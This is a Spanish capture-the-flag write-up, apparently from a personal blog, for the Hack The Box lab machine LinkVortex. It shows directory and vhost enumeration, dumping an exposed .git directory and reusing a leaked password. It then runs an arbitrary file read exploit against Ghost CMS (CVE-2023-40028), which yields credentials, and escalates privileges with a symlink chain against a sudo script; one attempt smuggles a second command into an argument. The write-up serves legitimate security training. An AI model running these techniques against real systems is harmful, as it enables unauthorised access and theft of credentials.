+</span></span><span class="line"><span class="cl">http://linkvortex.htb/ <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, HTTPServer<span class="o">[</span>Apache<span class="o">]</span>, IP<span class="o">[</span>10.10.11.47<span class="o">]</span>, JQuery<span class="o">[</span>3.5.1<span class="o">]</span>, MetaGenerator<span class="o">[</span>Ghost 5.58<span class="o">]</span>, Open-Graph-Protocol<span class="o">[</span>website<span class="o">]</span>, PoweredBy<span class="o">[</span>Ghost,a<span class="o">]</span>, Script<span class="o">[</span>application/ld+json<span class="o">]</span>, Title<span class="o">[</span>BitByBit Hardware<span class="o">]</span>, X-Powered-By<span class="o">[</span>Express<span class="o">]</span>, X-UA-Compatible<span class="o">[</span><span class="nv">IE</span><span class="o">=</span>edge<span class="o">]</span>
+</span></span></code></pre></div><h2 id="enumerar-directorios---gobuster">Enumerar directorios - Gobuster<a hidden class="anchor" aria-hidden="true" href="#enumerar-directorios---gobuster">#</a></h2>
+<p>Vamos a empezar a enumerar directorios con gobuster y de aquí lo más interesante que encontramos es un panel de login en /ghost.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ gobuster dir -u http://linkvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class="m">200</span> -r
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url: http://linkvortex.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method: GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads: <span class="m">200</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes: <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent: gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Follow Redirect: <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout: <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/about <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8284<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/rss <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 26682<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/feed <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 26682<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/About <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8284<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/RSS <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 26682<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/private <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12148<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/unsubscribe <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 24<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/LICENSE <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1065<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/cpu <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 15472<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/Rss <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 26682<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/ram <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 14746<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/ghost <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3787<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/psu <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 15163<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/Private <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 12148<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/Feed <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 26682<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/Ghost <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3787<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/RAM <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 14746<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/vga <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 15231<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/CPU <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 15472<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/VGA <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 15231<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Progress: <span class="m">55968</span> / <span class="m">220560</span> <span class="o">(</span>25.38%<span class="o">)</span>^C
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Keyboard interrupt detected, terminating.
+</span></span><span class="line"><span class="cl">Progress: <span class="m">55970</span> / <span class="m">220560</span> <span class="o">(</span>25.38%<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> context <span class="nv">canceled</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></div><p><img alt="LinkVortex Machine 1" loading="lazy" src="/img/linkvortex/linkvortex_machine_1.png"></p>
+<h2 id="enumerar-vhosts---gobuster">Enumerar vhosts - Gobuster<a hidden class="anchor" aria-hidden="true" href="#enumerar-vhosts---gobuster">#</a></h2>
+<p>He estado mirando pero por el momento como no he encontrado ninguna vulnerabilidad en el panel, voy a seguir enumerando pero esta vez subdominios. Aquí conseguimos enumerar el subdominio dev.linkvortex.htb</p>
+<p><img alt="LinkVortex Machine 2" loading="lazy" src="/img/linkvortex/linkvortex_machine_2.png"></p>
+<p>Nos sale un cartel diciendo que la página aún esta en construcción, nosotros por el momento vamos a hacerle un listado de directorios para ver si sacamos algo más de información.</p>
+<p>En un principio no me listaba nada con diretorios y he estado probando diccionarios hasta que he probado uno sobre metafiles y me ha descubierto el directorio .git/.</p>
+<h2 id="enumeración-directorios---ffuf">Enumeración directorios - Ffuf<a hidden class="anchor" aria-hidden="true" href="#enumeración-directorios---ffuf">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ffuf -w /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt:FUZZ -u http://dev.linkvortex.htb/FUZZ -fc <span class="m">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/<span class="s1">&#39;___\ /&#39;</span>___<span class="se">\ </span>/<span class="err">&#39;</span>___<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>/<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/ __ __ /<span class="se">\ \_</span>_/
+</span></span><span class="line"><span class="cl"><span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
+</span></span><span class="line"><span class="cl"><span class="se">\ \_\ \ \_\ \ \_</span>___/ <span class="se">\ \_\
+</span></span></span><span class="line"><span class="cl"><span class="se">\/</span>_/ <span class="se">\/</span>_/ <span class="se">\/</span>___/ <span class="se">\/</span>_/
+</span></span><span class="line"><span class="cl">v2.1.0
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">:: Method : GET
+</span></span><span class="line"><span class="cl">:: URL : http://dev.linkvortex.htb/FUZZ
+</span></span><span class="line"><span class="cl">:: Wordlist : FUZZ: /usr/share/SecLists/Discovery/Web-Content/versioning_metafiles.txt
+</span></span><span class="line"><span class="cl">:: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">:: Calibration : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">:: Timeout : <span class="m">10</span>
+</span></span><span class="line"><span class="cl">:: Threads : <span class="m">40</span>
+</span></span><span class="line"><span class="cl">:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl">:: Filter : Response status: <span class="m">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.git/packed-refs <span class="o">[</span>Status: 200, Size: 147, Words: 8, Lines: 4, Duration: 103ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git/description <span class="o">[</span>Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 103ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git/logs/HEAD <span class="o">[</span>Status: 200, Size: 175, Words: 8, Lines: 2, Duration: 103ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git <span class="o">[</span>Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git/config <span class="o">[</span>Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 103ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git/HEAD <span class="o">[</span>Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 102ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git/ <span class="o">[</span>Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 102ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.git/index <span class="o">[</span>Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 103ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>118/118<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">132</span> req/sec :: Duration: <span class="o">[</span>0:00:01<span class="o">]</span> :: Errors: <span class="m">0</span> ::
+</span></span></code></pre></div><p>Para trabajar mejor con un entorno git y ver si encuentro algo interesante voy a dumperame el git a mi maquina local para navegar cómodamente.</p>
+<h2 id="git-dump---password-leak">Git dump - Password Leak<a hidden class="anchor" aria-hidden="true" href="#git-dump---password-leak">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 -m venv entorno_virtual
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> entorno_virtual/bin/activate
+</span></span><span class="line"><span class="cl">pip install git-dumper
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/borhub/Workspace/HTB/linkvortex/CONTENT/git/entorno_virtual
+</span></span><span class="line"><span class="cl">git-dumper http://dev.linkvortex.htb/.git ./git
+</span></span></code></pre></div><p>Luego de haber estado buscando un buen rato he encontrado lo que podrían ser unas credenciales en /ghost/core/test/regressions/api/admin/authentication.test.js</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">it(&#39;complete</span> <span class="err">setup&#39;,</span> <span class="err">async</span> <span class="err">function</span> <span class="err">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">const</span> <span class="err">email</span> <span class="err">=</span> <span class="err">&#39;test@example.com&#39;;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">const</span> <span class="err">password</span> <span class="err">=</span> <span class="err">&#39;OctopiFociPilfer45&#39;;</span>
+</span></span></code></pre></div><p>Aquí realmente solo tenemos un ejemplo de contraseña pero antes habíamos visto en la web que un usuario llamado admin tenia varias publicaciones.</p>
+<p><img alt="LinkVortex Machine 3" loading="lazy" src="/img/linkvortex/linkvortex_machine_3.png"></p>
+<p>Con lo cual vamos a probar con el nombre de usuario + el dominio de la pagina web, junto con la contraseña que hemos visto en los archivos del .git/. Y así entramos al dashboard de la pagina web.</p>
+<p><img alt="LinkVortex Machine 4" loading="lazy" src="/img/linkvortex/linkvortex_machine_4.png"></p>
+<h1 id="acceso-inicial">Acceso inicial<a hidden class="anchor" aria-hidden="true" href="#acceso-inicial">#</a></h1>
+<h2 id="cve-2023-40028-ghost-cms-arbitrary-file-read">CVE-2023-40028: Ghost CMS Arbitrary File Read<a hidden class="anchor" aria-hidden="true" href="#cve-2023-40028-ghost-cms-arbitrary-file-read">#</a></h2>
+<p>En el whatweb anterior veíamos la versión de Ghost que se estaba usando, la 5.58. Ahora que estamos dentro de su panel vamos a buscar posibles vulnerabilidades.</p>
+<blockquote>
+<p>Ghost es un sistema de gestión de contenidos (CMS) de código abierto. Las versiones anteriores a la 5.59.1 están sujetas a una vulnerabilidad que permite a los usuarios autenticados cargar archivos que son enlaces simbólicos. Esto puede ser explotado para realizar una lectura arbitraria de cualquier archivo en el sistema operativo anfitrión.</p>
+</blockquote>
+<p><a href="https://github.com/godylockz/CVE-2023-40028/tree/main">https://github.com/godylockz/CVE-2023-40028/tree/main</a></p>
+<p>Utilizando este script en python conseguimos leer el archivo /etc/passwd y ademas nos recomienda leer otros archivo de configuración en el cual hay unas credenciales también.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 cve-2023-40028.py -t http://linkvortex.htb -u admin@linkvortex.htb -p OctopiFociPilfer45
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking authentication <span class="o">(</span>username/password<span class="o">)</span> ...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Admin session created successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to the Ghost file-read shell. Type <span class="nb">help</span> or ? to list commands.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">file&gt; /var/lib/ghost/config.production.json
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;url&#34;</span>: <span class="s2">&#34;http://localhost:2368&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;server&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;port&#34;</span>: 2368,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;host&#34;</span>: <span class="s2">&#34;::&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mail&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;transport&#34;</span>: <span class="s2">&#34;Direct&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;logging&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;transports&#34;</span>: <span class="o">[</span><span class="s2">&#34;stdout&#34;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;process&#34;</span>: <span class="s2">&#34;systemd&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;paths&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;contentPath&#34;</span>: <span class="s2">&#34;/var/lib/ghost/content&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;spam&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;user_login&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;minWait&#34;</span>: 1,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;maxWait&#34;</span>: 604800000,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;freeRetries&#34;</span>: <span class="m">5000</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mail&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;transport&#34;</span>: <span class="s2">&#34;SMTP&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;options&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;service&#34;</span>: <span class="s2">&#34;Google&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;host&#34;</span>: <span class="s2">&#34;linkvortex.htb&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;port&#34;</span>: 587,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;auth&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;user&#34;</span>: <span class="s2">&#34;bob@linkvortex.htb&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;pass&#34;</span>: <span class="s2">&#34;fibber-talented-worth&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">file&gt;
+</span></span></code></pre></div><p>Probamos a meter las credenciales obtenidas por ssh y obtenemos la terminal.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ssh bob@10.10.11.47
+</span></span><span class="line"><span class="cl">bob@10.10.11.47<span class="s1">&#39;s password:
+</span></span></span><span class="line"><span class="cl"><span class="s1">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">* Documentation: https://help.ubuntu.com
+</span></span></span><span class="line"><span class="cl"><span class="s1">* Management: https://landscape.canonical.com
+</span></span></span><span class="line"><span class="cl"><span class="s1">* Support: https://ubuntu.com/pro
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">This system has been minimized by removing packages and content that are not required on a system that users do not log into.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Sun Apr <span class="m">6</span> 17:56:25 <span class="m">2025</span> from 10.10.14.74
+</span></span><span class="line"><span class="cl">bob@linkvortex:~$ cat user.txt
+</span></span><span class="line"><span class="cl">2c7f66b6d4d0********************
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Cuando hacemos sudo -l vemos que nuestro usuario tiene permiso para ejecutar un archivo .sh como administrador sin necesidad de poner contraseña adjuntado un archivo acabado en .png.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linkvortex:/opt/ghost$ sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bob on linkvortex:
+</span></span><span class="line"><span class="cl">env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty, <span class="nv">env_keep</span><span class="o">+=</span>CHECK_CONTENT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User bob may run the following commands on linkvortex:
+</span></span><span class="line"><span class="cl"><span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+</span></span></code></pre></div><p>En un principio he intentado ejecutar comandos luego del archivo .png, pero detecta el uso de un segundo comando y es ahí cuando me pide la contraseña y ya el código no me deja ejecutar el comando.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh <span class="s2">&#34;prueba.png; whoami&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> bob:
+</span></span><span class="line"><span class="cl">Sorry, user bob is not allowed to execute <span class="s1">&#39;/usr/bin/bash /opt/ghost/clean_symlink.sh prueba.png; whoami&#39;</span> as root on linkvortex.
+</span></span></code></pre></div><h2 id="symlink-trickery-y-abuso-de-check_content">Symlink Trickery y Abuso de CHECK_CONTENT<a hidden class="anchor" aria-hidden="true" href="#symlink-trickery-y-abuso-de-check_content">#</a></h2>
+<p>Luego de revisar el código vi que el script revisa si el link simbólico del archivo .png para comprobar si contiene archivos sensibles como root o etc.</p>
+<p>Con lo cual para evitar esto vamos a hacer un bypass para engañar el filtro. Lo que haremos será lo siguiente hacer que el archivo al que apunta el .png sea un archivo cualquiera que luego apunta a /root/root.txt.</p>
+<p>hit-png -&gt; /home/bob/hit.txt | /home/bob/hit.txt -&gt; /root/root.txt</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linkvortex:~$ ln -s /root/root.txt hit.txt
+</span></span><span class="line"><span class="cl">bob@linkvortex:~$ ln -s /home/bob/hit.txt hit.png
+</span></span></code></pre></div><blockquote>
+<p>Para que el bypass funcione es importante definir la ruta absoluta, sino no funcionará.</p>
+</blockquote>
+<p>Si ahora ejecutamos el script funcionará pero no podremos ver el contenido ya que el CHECK_CONTENT por defecto esta como ==false==.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#codigo del script y porque no nos muestra el contenido</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nv">$CHECK_CONTENT</span><span class="p">;</span><span class="k">then</span>
+</span></span><span class="line"><span class="cl">	/usr/bin/echo <span class="s2">&#34;Content:&#34;</span>
+</span></span><span class="line"><span class="cl">	/usr/bin/cat <span class="nv">$QUAR_DIR</span>/<span class="nv">$LINK_NAME</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png
+</span></span></code></pre></div><p>Entonces le indicamos en el script que ponga el CHECK_CONTENT en true para que nos muestre la flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linkvortex:~$ sudo <span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="nb">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/hit.png
+</span></span><span class="line"><span class="cl">Link found <span class="o">[</span> /home/bob/hit.png <span class="o">]</span> , moving it to quarantine
+</span></span><span class="line"><span class="cl">Content:
+</span></span><span class="line"><span class="cl">46df14**************************
+</span></span><span class="line"><span class="cl">bob@linkvortex:~$
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/linkvortex/">Linkvortex</a></li>
+      <li><a href="https://borhuub.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://borhuub.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://borhuub.github.io/tags/git-dump/">Git Dump</a></li>
+      <li><a href="https://borhuub.github.io/tags/vhost/">Vhost</a></li>
+      <li><a href="https://borhuub.github.io/tags/symlink-trickery/">Symlink Trickery</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/fluffy/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Fluffy</span>
+  </a>
+  <a class="next" href="https://borhuub.github.io/writeups/nocturnal/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Nocutrnal</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
